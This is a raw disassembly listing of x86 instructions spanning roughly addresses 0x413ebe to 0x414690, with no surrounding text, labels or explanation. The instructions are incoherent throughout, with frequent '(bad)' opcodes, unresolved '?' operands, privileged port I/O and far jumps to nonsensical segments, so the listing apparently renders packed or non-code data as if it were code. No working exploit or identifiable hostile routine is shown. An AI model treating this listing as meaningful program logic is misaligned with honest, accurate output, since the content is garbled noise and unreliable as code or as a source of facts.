  413ebe:	dec    ebp
  413ebf:	xchg   esp,eax
  413ec0:	iret   
  413ec1:	dec    esi
  413ec2:	xchg   DWORD PTR [edx+esi*4],ebx
  413ec5:	adc    dh,BYTE PTR [ecx+0x662acdf3]
  413ecb:	arpl   WORD PTR [eax-0x29],si
  413ece:	fwait
  413ecf:	dec    esp
  413ed0:	fisttp QWORD PTR [ebp-0x74]
  413ed3:	(bad)  
  413ed4:	scas   eax,DWORD PTR es:[edi]
  413ed5:	not    BYTE PTR [ecx-0x13]
  413ed8:	repz inc ebx
  413eda:	(bad)  
  413edb:	into   
  413edc:	rcr    esi,1
  413ede:	push   ds
  413edf:	fld    QWORD PTR [ebx]
  413ee1:	mov    ds:0xecf50831,al
  413ee6:	xor    dl,BYTE PTR [edi+ebx*2-0x6c]
  413eea:	mov    BYTE PTR fs:[ebx+ecx*1],cl
  413eee:	pop    edi
  413eef:	dec    edx
  413ef0:	jle    0x413f25
  413ef2:	cmc    
  413ef3:	fs push edx
  413ef5:	aam    0x22
  413ef7:	repnz push eax
  413ef9:	mov    edi,DWORD PTR [edx]
  413efb:	push   ecx
  413efc:	sbb    DWORD PTR [eax+0x30],edi
  413eff:	sub    al,0x16
  413f01:	mov    WORD PTR [eax+0x2392a532],fs
  413f07:	adc    dl,BYTE PTR [ebp-0x9]
  413f0a:	ja     0x413ef0
  413f0c:	dec    eax
  413f0d:	mov    ecx,0x98b71daf
  413f12:	imul   esi,eax,0x63
  413f15:	clc    
  413f16:	sub    esi,ebp
  413f18:	jge    0x413edc
  413f1a:	push   eax
  413f1b:	(bad)  
  413f1c:	cmp    al,0xb1
  413f1e:	pop    esp
  413f1f:	shr    DWORD PTR [eax+eiz*2-0x18],cl
  413f23:	imul   BYTE PTR [ecx]
  413f25:	sbb    eax,0xfcda360f
  413f2a:	jnp    0x413f0c
  413f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f2d:	pop    ds
  413f2e:	loopne 0x413fa5
  413f30:	sar    esp,0x38
  413f33:	(bad)  
  413f34:	dec    esp
  413f35:	push   ss
  413f36:	mov    ds:0x7b0dfb79,al
  413f3b:	push   ebx
  413f3c:	cs test al,0xa7
  413f3f:	adc    al,0x9e
  413f41:	mov    edi,0x673d871f
  413f46:	leave  
  413f47:	shr    DWORD PTR [ebp+0x1e],cl
  413f4a:	inc    ecx
  413f4b:	sbb    ah,BYTE PTR ds:0xc4d0651
  413f51:	cli    
  413f52:	adc    BYTE PTR [ebx],ah
  413f54:	addr16 adc al,0x85
  413f57:	bound  ebp,QWORD PTR [eax]
  413f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f5a:	loop   0x413f71
  413f5c:	mov    al,0xbc
  413f5e:	jge    0x413f2f
  413f60:	push   esi
  413f61:	daa    
  413f62:	ror    DWORD PTR [eax+0x77],1
  413f65:	ins    BYTE PTR es:[edi],dx
  413f66:	cmc    
  413f67:	pop    es
  413f68:	je     0x413eef
  413f6a:	xor    DWORD PTR [ebx-0x1e267cb3],edx
  413f70:	jge    0x413f99
  413f72:	ret    
  413f73:	cdq    
  413f74:	adc    ah,al
  413f76:	mov    al,ds:0x63bf0ac0
  413f7b:	call   0x209c:0x9e4f3760
  413f82:	jmp    0x413f2a
  413f84:	stc    
  413f85:	pushf  
  413f86:	jge    0x413f39
  413f88:	out    dx,al
  413f89:	out    0x2b,eax
  413f8b:	fimul  WORD PTR [ebx-0x1b30659c]
  413f91:	imul   esi,DWORD PTR [ebx-0x66e253d5],0x9065a3c0
  413f9b:	xchg   DWORD PTR [eax-0x7],ebp
  413f9e:	cmpxchg DWORD PTR [ebp+0x5e],eax
  413fa2:	sbb    eax,0x3bfd9b68
  413fa7:	mov    ebp,0xc4486f17
  413fac:	pop    ebx
  413fad:	test   BYTE PTR [esi-0x6c91d182],0xc
  413fb4:	mov    ds:0xfb6b26cc,eax
  413fb9:	jns    0x413f68
  413fbb:	dec    eax
  413fbc:	jge    0x413f3e
  413fbe:	hlt    
  413fbf:	and    dh,ch
  413fc1:	sub    edx,eax
  413fc3:	cmp    edx,DWORD PTR [edx+0x73]
  413fc6:	add    eax,0x4f735cf4
  413fcb:	mov    dl,0x90
  413fcd:	xchg   esp,eax
  413fce:	mov    al,0x58
  413fd0:	sub    DWORD PTR [edx-0x8c67c25],edx
  413fd6:	in     eax,0x10
  413fd8:	sub    BYTE PTR [eax],0x6c
  413fdb:	js     0x413f9b
  413fdd:	in     al,0xdb
  413fdf:	cmp    al,0x74
  413fe1:	or     edx,DWORD PTR [ecx+0x67f09633]
  413fe7:	js     0x413f93
  413fe9:	cld    
  413fea:	cmp    eax,0x71064ec0
  413fef:	enter  0xa42c,0x35
  413ff3:	push   ecx
  413ff4:	mov    DWORD PTR [edi+0x7d],edi
  413ff7:	and    edi,DWORD PTR ds:0x56d4475c
  413ffd:	shl    BYTE PTR [esi-0x7cdf9657],1
  414003:	aam    0x35
  414005:	jnp    0x414037
  414007:	cli    
  414008:	pop    ebx
  414009:	sbb    BYTE PTR [esi+edx*1+0x61],cl
  41400d:	mov    bh,0x69
  41400f:	xchg   esp,eax
  414010:	ja     0x413fbd
  414012:	jbe    0x41404e
  414014:	or     cl,BYTE PTR [esi]
  414016:	cs aad 0x3f
  414019:	imul   ecx,DWORD PTR [edi],0xa6e67ac9
  41401f:	mov    ah,al
  414021:	sub    ch,BYTE PTR [edi-0x31]
  414024:	retf   
  414025:	inc    ebp
  414026:	(bad)  
  414027:	mov    dh,0x5f
  414029:	arpl   WORD PTR [edi+0x37],bp
  41402c:	adc    al,0xaf
  41402e:	lods   al,BYTE PTR ds:[esi]
  41402f:	cs ret 0x585c
  414033:	push   cs
  414034:	shl    BYTE PTR [edi-0x46b1ac7],cl
  41403a:	cmp    esp,DWORD PTR [esi-0x53]
  41403d:	lds    edi,FWORD PTR [ecx+0x3e8395bc]
  414043:	mov    dl,BYTE PTR [eax-0x73]
  414046:	mov    bl,0x9
  414048:	aam    0x8f
  41404a:	cmp    cl,ah
  41404c:	addr16 xchg esp,eax
  41404e:	out    dx,al
  41404f:	(bad)  
  414050:	cmp    bh,ch
  414052:	sbb    BYTE PTR ss:[edx+0x3d],bl
  414056:	push   eax
  414057:	repnz mov WORD PTR [ebp+0x4e845bae],cs
  41405e:	sbb    edx,DWORD PTR [ebx]
  414060:	sub    dl,BYTE PTR [ecx+edi*8+0x12]
  414064:	sbb    al,0x29
  414066:	xchg   BYTE PTR [ebp-0x64],bl
  414069:	aad    0x15
  41406b:	pop    esi
  41406d:	fidiv  DWORD PTR [ecx+0x31]
  414070:	enter  0xf1e8,0xbf
  414074:	popa   
  414075:	dec    ebx
  414076:	push   esi
  414077:	sub    al,0x4e
  414079:	inc    edi
  41407a:	fadd   DWORD PTR [esi-0x4721cd3e]
  414080:	pmulhw mm1,QWORD PTR [edi-0x6a]
  414084:	lds    ecx,FWORD PTR [esp+ebx*2+0x912e5f6]
  41408b:	dec    esp
  41408c:	fcmovbe st,st(2)
  41408e:	shl    dl,cl
  414090:	add    esi,ecx
  414092:	mov    dh,0xe6
  414094:	retf   0x5e46
  414097:	rep outs dx,BYTE PTR ds:[esi]
  414099:	dec    ecx
  41409a:	ret    
  41409b:	cmp    al,0x29
  41409d:	pop    eax
  41409e:	popa   
  41409f:	loope  0x414065
  4140a1:	test   al,dl
  4140a3:	jne    0x414050
  4140a5:	das    
  4140a6:	and    DWORD PTR [esi-0x23],0x867f0493
  4140ad:	xor    BYTE PTR [eax],0x35
  4140b0:	test   eax,0x38ee7a9a
  4140b5:	pop    ebp
  4140b6:	ss aam 0xb0
  4140b9:	hlt    
  4140ba:	lds    esp,FWORD PTR [edx+0x6b]
  4140bd:	cdq    
  4140be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140bf:	or     DWORD PTR [ecx+0x37],0xffffffa2
  4140c3:	iret   
  4140c4:	mov    ebp,0x5bd6f532
  4140c9:	pushf  
  4140ca:	lds    ebp,FWORD PTR [ecx+0x66]
  4140cd:	xchg   ebx,eax
  4140ce:	xchg   BYTE PTR [edx],ah
  4140d0:	xchg   edi,eax
  4140d1:	cmc    
  4140d2:	mov    bl,0x15
  4140d4:	repnz mov bl,0xef
  4140d7:	aaa    
  4140d8:	mov    WORD PTR [esp+esi*4+0x78f9b396],?
  4140df:	mov    BYTE PTR [esi+0x2b868acd],ch
  4140e5:	lds    eax,FWORD PTR [edi]
  4140e7:	sub    al,0x35
  4140e9:	lea    esi,[ebx]
  4140eb:	ficomp WORD PTR [eax-0x2272e90]
  4140f1:	mov    dl,bh
  4140f3:	add    al,BYTE PTR [ecx+0x75bae651]
  4140f9:	jns    0x4140fb
  4140fb:	add    ebx,DWORD PTR [edx-0x66565d34]
  414101:	es mov dl,0x18
  414104:	loop   0x4140ad
  414106:	arpl   dx,si
  414108:	mov    ds:0x8567194b,al
  41410d:	add    al,BYTE PTR [eax-0x6e4e8348]
  414113:	shr    BYTE PTR [ebp-0x53],0xf6
  414117:	jg     0x414105
  414119:	sbb    BYTE PTR [edx+0x21],ch
  41411c:	pop    ecx
  41411d:	mov    di,0x6379
  414121:	jmp    FWORD PTR [ecx-0x7b]
  414124:	xchg   esp,eax
  414125:	push   cs
  414126:	mov    eax,ds:0x84892c51
  41412b:	mov    ebp,0xa6be55b4
  414130:	shr    BYTE PTR [edi-0x533dc6e9],cl
  414136:	fstp   st(6)
  414138:	mov    ecx,0xcf514ad2
  41413d:	jb     0x4140e2
  41413f:	or     ah,BYTE PTR ds:0x1115873f
  414145:	mov    ch,0x34
  414147:	rol    BYTE PTR [ebx],0xcd
  41414a:	xchg   esi,eax
  41414b:	xchg   edi,eax
  41414c:	add    al,0x99
  41414e:	lds    edi,FWORD PTR [esi]
  414150:	and    esi,DWORD PTR [esi]
  414152:	and    esi,edx
  414154:	cmp    al,bh
  414156:	jno    0x414163
  414158:	mov    bh,0x34
  41415a:	or     ecx,edx
  41415c:	jae    0x4140e3
  41415e:	mov    es,WORD PTR [ebx+ebx*2]
  414161:	xor    eax,0x3002bd7d
  414166:	fild   WORD PTR [edx-0x38524f79]
  41416c:	sahf   
  41416d:	mov    dl,0x1a
  41416f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414170:	add    al,0xcf
  414172:	cdq    
  414173:	push   cs
  414174:	xchg   DWORD PTR [eax+0x16907771],ebp
  41417a:	sar    BYTE PTR [edx+0x27],cl
  41417d:	mov    edi,0x33469d28
  414182:	shr    DWORD PTR [edi-0x5970de92],cl
  414188:	idiv   DWORD PTR [edx]
  41418a:	inc    esp
  41418b:	ret    
  41418c:	out    0xe3,al
  41418e:	mov    ebp,0x3ccb8c9e
  414193:	or     cl,bl
  414195:	xchg   esp,eax
  414196:	adc    dl,0x75
  414199:	test   eax,0xd66899a5
  41419e:	jno    0x4141e8
  4141a0:	retf   0xfabe
  4141a3:	cld    
  4141a4:	xchg   esi,eax
  4141a5:	xor    BYTE PTR [edx],bl
  4141a7:	dec    edx
  4141a8:	dec    ebp
  4141a9:	add    DWORD PTR [ecx+ecx*4-0x52],edi
  4141ad:	mov    cl,0x18
  4141af:	fs stos BYTE PTR es:[edi],al
  4141b1:	and    ecx,DWORD PTR [ebx]
  4141b3:	dec    edx
  4141b4:	popa   
  4141b5:	outs   dx,BYTE PTR ds:[esi]
  4141b6:	push   eax
  4141b7:	xor    edx,DWORD PTR [esi]
  4141b9:	push   ss
  4141ba:	and    ch,BYTE PTR [ebp-0x8]
  4141bd:	dec    esp
  4141be:	sbb    esp,edx
  4141c0:	loop   0x414199
  4141c2:	fwait
  4141c3:	out    dx,eax
  4141c4:	dec    ebx
  4141c5:	jmp    0x77e1:0xa4da
  4141cb:	rcr    ah,0x37
  4141ce:	mov    ds:0x9cc9921a,eax
  4141d3:	fisub  DWORD PTR [ecx]
  4141d5:	xor    al,0xa0
  4141d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141d8:	or     al,0xc1
  4141da:	jb     0x41423e
  4141dc:	and    edx,ebp
  4141de:	inc    ecx
  4141df:	mov    cl,0xb2
  4141e1:	jmp    0x41423e
  4141e3:	out    0xf6,eax
  4141e5:	scas   eax,DWORD PTR es:[edi]
  4141e6:	dec    esp
  4141e7:	dec    esp
  4141e8:	imul   edx,edx,0x1
  4141eb:	jae    0x4141e5
  4141ed:	xchg   BYTE PTR [edx],dl
  4141ef:	mov    ah,0xc3
  4141f1:	hlt    
  4141f2:	jmp    0x1941:0x7baa0b87
  4141f9:	push   ebp
  4141fa:	jecxz  0x41421c
  4141fc:	lahf   
  4141fd:	int3   
  4141fe:	stos   DWORD PTR es:[edi],eax
  4141ff:	out    0xfb,eax
  414201:	(bad)  
  414202:	fld    DWORD PTR [edx]
  414204:	push   0x4ec34011
  414209:	sbb    ebx,DWORD PTR [edx+0x74a5adc3]
  41420f:	xor    eax,0x8a0ab3d
  414214:	jae    0x4141ba
  414216:	in     eax,0x93
  414218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414219:	xchg   edi,eax
  41421a:	call   0x76ba9c5f
  41421f:	pop    ebp
  414220:	and    al,0xb8
  414222:	add    eax,eax
  414224:	out    0xef,eax
  414226:	in     al,dx
  414227:	loop   0x4142a2
  414229:	(bad)  
  41422b:	test   DWORD PTR [eax],eax
  41422d:	lods   al,BYTE PTR ds:[esi]
  41422e:	jns    0x4141dc
  414230:	rcr    dl,1
  414232:	xchg   ebp,eax
  414233:	push   ebx
  414234:	callw  0x3fb3
  414238:	sbb    eax,0xe7a6955d
  41423d:	ds mov ecx,esp
  414240:	bound  eax,QWORD PTR [edx]
  414242:	pop    es
  414243:	jb     0x41421c
  414245:	mov    ecx,DWORD PTR [eax-0x3eb08531]
  41424b:	xor    eax,0xbf7533b5
  414250:	fsub   DWORD PTR [ebp-0x49]
  414253:	mul    BYTE PTR [ecx+0x19ded326]
  414259:	je     0x4141dc
  41425b:	inc    eax
  41425c:	inc    eax
  41425d:	and    eax,0xb10b347f
  414262:	aas    
  414263:	mov    al,0xd2
  414265:	mov    cl,0x4a
  414267:	mov    esp,0x1b0c7211
  41426c:	in     eax,0xd8
  41426e:	or     cl,BYTE PTR ds:0x862e30fb
  414274:	into   
  414275:	ret    
  414276:	dec    ebp
  414277:	retf   
  414278:	mov    esi,0x1d3c57d7
  41427d:	dec    ebx
  41427e:	call   0x9b309100
  414283:	and    bl,cl
  414285:	(bad)  
  414286:	scas   eax,DWORD PTR es:[edi]
  414287:	imul   esp,DWORD PTR [eax-0x34],0x710ff70
  41428e:	sbb    dl,BYTE PTR [esi-0x72]
  414291:	jne    0x4142c5
  414293:	inc    edx
  414294:	mov    esp,0x9763f297
  414299:	jecxz  0x4142e9
  41429b:	out    dx,al
  41429c:	lock fidiv WORD PTR [ebp-0xa]
  4142a0:	sub    ecx,DWORD PTR [ebp+0x3e]
  4142a3:	dec    ebp
  4142a4:	mov    esi,0xe31e6680
  4142a9:	sbb    BYTE PTR [ebp-0x35c1ae30],cl
  4142af:	lea    ebx,[esi-0x24]
  4142b2:	pop    ds
  4142b3:	loop   0x414283
  4142b5:	in     al,0x3b
  4142b7:	into   
  4142b8:	gs fs pop ebp
  4142bb:	xchg   ebp,eax
  4142bc:	mov    ds:0xe38308f2,eax
  4142c1:	pop    eax
  4142c2:	xchg   DWORD PTR [edx+0x22],edi
  4142c5:	imul   ecx,DWORD PTR [eax+0x73],0xe8cb8a56
  4142cc:	popa   
  4142cd:	test   bh,al
  4142cf:	cmp    BYTE PTR [ebx-0x12956297],dl
  4142d5:	push   ds
  4142d6:	push   esp
  4142d7:	and    BYTE PTR [ebp+0x59],0xfe
  4142db:	jl     0x4142b0
  4142dd:	sahf   
  4142de:	test   eax,0x9578b3f0
  4142e3:	inc    esp
  4142e4:	sbb    ebx,DWORD PTR [edi]
  4142e6:	inc    ecx
  4142e7:	daa    
  4142e8:	dec    esi
  4142e9:	fwait
  4142ea:	jnp    0x414354
  4142ec:	in     eax,dx
  4142ed:	psrlw  mm0,QWORD PTR [ecx]
  4142f0:	xor    BYTE PTR [eax+0x7a],al
  4142f3:	ror    DWORD PTR [edi-0x11],1
  4142f6:	stos   BYTE PTR es:[edi],al
  4142f7:	sar    al,0x8c
  4142fa:	cdq    
  4142fb:	es inc eax
  4142fd:	sbb    al,0x45
  4142ff:	jmp    0x2b8b50ee
  414304:	xchg   cl,dl
  414306:	cwde   
  414307:	jg     0x414353
  414309:	mov    esp,0xb8ff8239
  41430e:	push   cs
  41430f:	sbb    al,0xa7
  414311:	pop    es
  414312:	xchg   esp,eax
  414313:	data16 mov bl,dl
  414316:	int    0xd
  414318:	sub    al,0x38
  41431a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41431b:	bt     esp,ebp
  41431e:	jb     0x41433a
  414320:	mov    bl,0x2c
  414322:	fisub  WORD PTR [edx-0x29]
  414325:	in     eax,0xe
  414327:	aam    0x3c
  414329:	mov    WORD PTR [ebp-0x7c4bc8b3],ss
  41432f:	mov    ?,WORD PTR [eax]
  414331:	jnp    0x4142f5
  414333:	mov    dl,0x8c
  414335:	xor    DWORD PTR [edx-0x5b],0x7e
  414339:	scas   eax,DWORD PTR es:[edi]
  41433a:	iret   
  41433b:	out    0xae,al
  41433d:	(bad)  
  41433e:	hlt    
  41433f:	popa   
  414340:	mov    ds:0x947818f6,al
  414345:	pop    ss
  414346:	jmp    0xc7f3c502
  41434b:	cmp    DWORD PTR ds:0x51591fef,esp
  414351:	fs push ebp
  414353:	inc    ebx
  414354:	push   ebp
  414355:	xchg   dl,ah
  414357:	pop    ebx
  414358:	rcr    BYTE PTR [esi+0x10],1
  41435b:	push   edi
  41435c:	call   0xc7806a90
  414361:	sbb    esp,edx
  414363:	cmp    eax,0x53108792
  414368:	sbb    esi,DWORD PTR [edi+0x582bd6eb]
  41436e:	push   ebp
  41436f:	xchg   ecx,eax
  414370:	mov    bl,0x4d
  414372:	mov    edi,edx
  414374:	lds    ebx,FWORD PTR [edx+0x2d]
  414377:	push   0xd8938301
  41437c:	dec    esp
  41437d:	nop
  41437e:	inc    ebp
  41437f:	out    dx,eax
  414380:	xor    BYTE PTR [eax+0x30e1c5a6],0xdb
  414387:	rcl    dl,1
  414389:	xor    esi,DWORD PTR [edi+ebp*8+0x33]
  41438d:	sub    al,BYTE PTR [ebp+0x3ec54060]
  414393:	pop    es
  414394:	in     al,0xdd
  414396:	mov    ds:0x249dc51f,eax
  41439b:	stos   DWORD PTR es:[edi],eax
  41439c:	ficomp DWORD PTR [edx]
  41439e:	stos   DWORD PTR es:[edi],eax
  41439f:	inc    edi
  4143a0:	data16 out dx,al
  4143a2:	mov    bl,0xf1
  4143a4:	stos   DWORD PTR es:[edi],eax
  4143a5:	lods   al,BYTE PTR ds:[esi]
  4143a6:	(bad)  
  4143a7:	call   0x1a5ad05f
  4143ac:	pop    ds
  4143ad:	inc    edx
  4143ae:	aad    0xb7
  4143b0:	add    edx,esp
  4143b2:	lea    eax,[ebp+0x2e]
  4143b5:	sbb    edi,0x78e711b6
  4143bb:	push   0xe8191ee2
  4143c0:	or     esi,ebx
  4143c2:	scas   al,BYTE PTR es:[edi]
  4143c3:	pop    ds
  4143c4:	jg     0x414383
  4143c6:	mov    al,0xe3
  4143c8:	outs   dx,BYTE PTR ds:[esi]
  4143c9:	fdivr  QWORD PTR [edi+0x1e]
  4143cc:	lahf   
  4143cd:	in     al,0x6d
  4143cf:	(bad)  
  4143d1:	pop    ecx
  4143d2:	repz sub BYTE PTR [edx+eiz*1+0x67700ce9],al
  4143da:	add    ebp,ebp
  4143dc:	xor    BYTE PTR [esi-0x12],ah
  4143df:	push   ebp
  4143e0:	mov    al,0x5b
  4143e2:	popf   
  4143e3:	sar    DWORD PTR [ebx],1
  4143e5:	sbb    DWORD PTR [eax],eax
  4143e7:	inc    ebx
  4143e8:	lods   al,BYTE PTR ds:[esi]
  4143e9:	ins    BYTE PTR es:[edi],dx
  4143ea:	xchg   WORD PTR [ebp+eiz*8+0x7f73bcf4],bx
  4143f2:	rol    BYTE PTR [edx],cl
  4143f4:	jmp    0x93c0:0x4ec4bee0
  4143fb:	fist   WORD PTR [edx]
  4143fd:	loopne 0x414443
  4143ff:	imul   esp,DWORD PTR [esi-0x7c],0x21
  414403:	xchg   esp,eax
  414404:	sbb    DWORD PTR ds:0xfe1fa1f1,esp
  41440a:	xchg   ecx,eax
  41440b:	push   edi
  41440c:	lods   eax,DWORD PTR ds:[esi]
  41440d:	cmp    BYTE PTR [ebx+eax*8-0x386bcf1],0xce
  414415:	push   eax
  414416:	and    BYTE PTR [ecx],0x52
  414419:	shl    BYTE PTR [esi],1
  41441b:	ins    BYTE PTR es:[edi],dx
  41441c:	jecxz  0x41443e
  41441e:	loop   0x414459
  414420:	fwait
  414421:	add    ecx,DWORD PTR [ecx-0x62]
  414424:	add    eax,0x322393c2
  414429:	enter  0x7ccb,0xa9
  41442d:	xchg   DWORD PTR [ebx],edx
  41442f:	sbb    al,0x85
  414431:	into   
  414432:	mov    eax,0x6cedf9ac
  414437:	es cmp esi,esp
  41443a:	jmp    0x9dfe65e0
  41443f:	(bad)  
  414441:	sbb    BYTE PTR [ebx],dl
  414443:	pop    esi
  414444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414445:	jbe    0x414461
  414447:	mov    ebp,0x36552a0c
  41444c:	test   al,0x12
  41444e:	xchg   esi,eax
  41444f:	ins    BYTE PTR es:[edi],dx
  414450:	mov    BYTE PTR [edx+0x1b],ch
  414453:	jnp    0x414481
  414455:	xor    al,0xd2
  414457:	inc    ebp
  414458:	adc    ebp,DWORD PTR ds:[edi-0x14]
  41445c:	or     al,0xcd
  41445e:	sub    dl,cl
  414460:	adc    al,0x96
  414462:	mov    WORD PTR [edx-0x475c2c24],?
  414468:	dec    edi
  414469:	lock add eax,0xb5a90807
  41446f:	shl    esp,cl
  414471:	ret    0xb3f7
  414474:	sub    al,BYTE PTR [ecx-0x26]
  414477:	int3   
  414478:	repnz pop esp
  41447a:	lock sub eax,0x9445ab9f
  414480:	lock ficomp WORD PTR [edx+ebx*4+0x4e2a0863]
  414488:	jb     0x41443a
  41448a:	sub    dl,BYTE PTR es:[ebx+esi*8-0x66]
  41448f:	adc    eax,0xc55a3fdf
  414494:	sar    DWORD PTR [esp+eiz*2-0x4d],1
  414498:	add    eax,0xd9813c7b
  41449d:	or     dh,BYTE PTR [ebx+0x431eb89a]
  4144a3:	(bad)  
  4144a4:	xchg   edi,eax
  4144a5:	or     ah,BYTE PTR [eax-0x564527a4]
  4144ab:	test   BYTE PTR [edi-0x1ba0d70b],dh
  4144b1:	sbb    DWORD PTR [esi],esp
  4144b3:	or     DWORD PTR [ebp+0x6],ebp
  4144b6:	cmp    ecx,ecx
  4144b8:	or     edx,DWORD PTR [ebp+0x1216756b]
  4144be:	and    ch,BYTE PTR [bp+di]
  4144c1:	xchg   BYTE PTR [edx],cl
  4144c3:	xchg   BYTE PTR [ecx],dh
  4144c5:	pop    ss
  4144c6:	mov    ecx,0xaabd5255
  4144cb:	fadd   st(4),st
  4144cd:	sub    al,0xd9
  4144cf:	ret    0x27bc
  4144d2:	or     BYTE PTR [ebp-0x5b0ca6e4],dl
  4144d8:	fistp  WORD PTR [edi-0x64]
  4144db:	sbb    DWORD PTR [ebx],0x5c848a31
  4144e1:	add    esp,edx
  4144e3:	retf   0xae7f
  4144e6:	add    ecx,DWORD PTR [edi+0x56]
  4144e9:	mov    al,ds:0xf5fdede1
  4144ee:	iret   
  4144ef:	pop    ecx
  4144f0:	add    ah,al
  4144f2:	sbb    DWORD PTR [esi+0x7e],ecx
  4144f5:	inc    esi
  4144f6:	pop    ecx
  4144f7:	pushf  
  4144f8:	enter  0x19c3,0xf0
  4144fc:	jmp    0x9bc1655
  414501:	dec    esp
  414502:	xchg   esp,eax
  414503:	out    0xdc,eax
  414505:	xchg   ecx,eax
  414506:	std    
  414507:	test   DWORD PTR [ebx-0x35deeb5d],0x7be357e9
  414511:	rol    ecx,cl
  414513:	pushfw 
  414515:	mov    gs,WORD PTR [edx+0x69]
  414518:	jge    0x41450a
  41451a:	es in  al,0x76
  41451d:	clc    
  41451e:	add    eax,0xfc65d035
  414523:	mov    ebx,0xf06e115d
  414528:	sub    edi,edx
  41452a:	jne    0x41451c
  41452c:	cmc    
  41452d:	addr16 leave 
  41452f:	mov    edx,0x4d451dc
  414534:	add    al,BYTE PTR [ebx]
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	sub    BYTE PTR [esi+0x361d3638],dl
  41453d:	pushf  
  41453e:	lds    esp,FWORD PTR [edi]
  414540:	mov    WORD PTR [edi+0x1efedf06],es
  414546:	mov    fs,ecx
  414548:	pop    ebx
  414549:	fcomp  DWORD PTR [eax-0xb]
  41454c:	(bad)  
  41454d:	jp     0x414505
  41454f:	mov    dh,0xdd
  414551:	sbb    esi,eax
  414553:	(bad)  
  414554:	out    dx,al
  414555:	mov    al,ds:0x52d41e10
  41455a:	pop    esi
  41455b:	test   al,0x45
  41455d:	add    eax,0xb8ac6dc8
  414562:	cmp    eax,0x6ce9d491
  414567:	jmp    0x881962cc
  41456c:	mov    ebx,0x19fea437
  414571:	mov    DWORD PTR [ebx+0x17ea5627],ecx
  414577:	in     eax,0x41
  414579:	mov    edi,0xefb3711b
  41457e:	(bad)  
  41457f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414581:	test   BYTE PTR [edi-0x5b3ea8e6],bl
  414587:	inc    ebp
  414588:	lahf   
  414589:	(bad)  
  41458a:	adc    ah,al
  41458c:	xchg   DWORD PTR [ebp+0x3c9a95a0],esi
  414592:	jmp    0xa100:0x5b5c0ba1
  414599:	mov    ds:0x7b675a3a,al
  41459e:	dec    eax
  41459f:	cmp    BYTE PTR [edi-0x175b2720],ah
  4145a5:	aaa    
  4145a6:	jg     0x4145aa
  4145a8:	ds retf 
  4145aa:	adc    ecx,DWORD PTR [eax+0x7e10fbf7]
  4145b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b1:	scas   eax,DWORD PTR es:[edi]
  4145b2:	xor    esp,DWORD PTR [ebp+0x4a53874d]
  4145b8:	pop    edx
  4145b9:	jge    0x4145c1
  4145bb:	pop    ss
  4145bc:	out    0x81,al
  4145be:	inc    esp
  4145bf:	sub    al,0xcf
  4145c1:	dec    edx
  4145c2:	mov    al,0x70
  4145c4:	or     BYTE PTR [eax-0x37],bh
  4145c7:	or     cl,BYTE PTR [esi]
  4145c9:	xor    ebp,DWORD PTR [ecx+0x30]
  4145cc:	mov    ah,BYTE PTR [edx]
  4145ce:	leave  
  4145cf:	mov    ch,0x28
  4145d1:	xchg   esi,eax
  4145d2:	les    ebp,FWORD PTR [edi+esi*4-0x56]
  4145d6:	mov    bl,0x76
  4145d8:	push   ebp
  4145d9:	aas    
  4145da:	sub    esp,DWORD PTR [ecx+0x786b531b]
  4145e0:	inc    esp
  4145e1:	hlt    
  4145e2:	adc    DWORD PTR [ebp-0x6a],eax
  4145e5:	mov    BYTE PTR [edi],dl
  4145e7:	and    edi,DWORD PTR [edi+0x29c8d7bc]
  4145ed:	stos   BYTE PTR es:[edi],al
  4145ee:	inc    esi
  4145ef:	(bad)  
  4145f0:	retf   
  4145f1:	cmc    
  4145f2:	cmc    
  4145f3:	mov    ebp,0xb700fda9
  4145f8:	in     eax,dx
  4145f9:	cmp    eax,0xeade4939
  4145fe:	pop    eax
  4145ff:	hlt    
  414600:	jp     0x4145a0
  414602:	out    0xb4,al
  414604:	repz gs xchg ebp,eax
  414607:	je     0x4145a0
  414609:	fst    QWORD PTR [ebp+0x41]
  41460c:	test   al,0xd6
  41460e:	mov    ebp,DWORD PTR [edi]
  414610:	adc    al,0xc1
  414612:	sti    
  414613:	cwde   
  414614:	mov    edx,0x60467482
  414619:	add    dl,BYTE PTR [esi+0x69fc50dd]
  41461f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414620:	xchg   ebx,eax
  414621:	cmp    BYTE PTR [edi-0xcd5a759],cl
  414627:	push   esp
  414628:	bound  esp,QWORD PTR [edi-0x36]
  41462b:	push   esp
  41462c:	stos   BYTE PTR es:[edi],al
  41462d:	int    0xf0
  41462f:	retf   
  414630:	fs retf 0x8b9b
  414634:	lea    ebx,[ecx-0x38]
  414637:	add    al,0x19
  414639:	in     eax,dx
  41463a:	jl     0x4145f2
  41463c:	jg     0x41464b
  41463e:	das    
  41463f:	mov    esi,0x844ef760
  414644:	or     al,0xd7
  414646:	shl    BYTE PTR [edi-0x37],cl
  414649:	ins    DWORD PTR es:[edi],dx
  41464a:	cwde   
  41464b:	cmc    
  41464c:	xchg   ebp,eax
  41464d:	xor    bh,BYTE PTR [edx+eiz*4]
  414650:	xor    al,BYTE PTR [ebx-0x66]
  414653:	cmp    eax,esp
  414655:	aam    0xb5
  414657:	push   esp
  414658:	cmp    ecx,DWORD PTR [esi+0x1c24a8a2]
  41465e:	mov    bh,0x87
  414660:	mov    ebp,0x7a49be0f
  414665:	dec    edi
  414666:	in     eax,0x9e
  414668:	xchg   esi,eax
  414669:	fistp  QWORD PTR [ebp+0x56b91658]
  41466f:	stc    
  414670:	aad    0xcb
  414672:	inc    ecx
  414673:	or     al,0xbb
  414675:	sti    
  414676:	xor    al,0x2b
  414678:	xchg   DWORD PTR [edi],ebx
  41467a:	je     0x41466c
  41467c:	loopne 0x414603
  41467e:	jge    0x4146d5
  414680:	xor    bl,ah
  414682:	push   esp
  414683:	aas    
  414684:	pop    ecx
  414685:	adc    al,0xf3
  414687:	hlt    
  414688:	mov    ?,WORD PTR [eax-0x4b]
  41468b:	adc    eax,0xe23816ba
  414690:	cmp    al,0x54
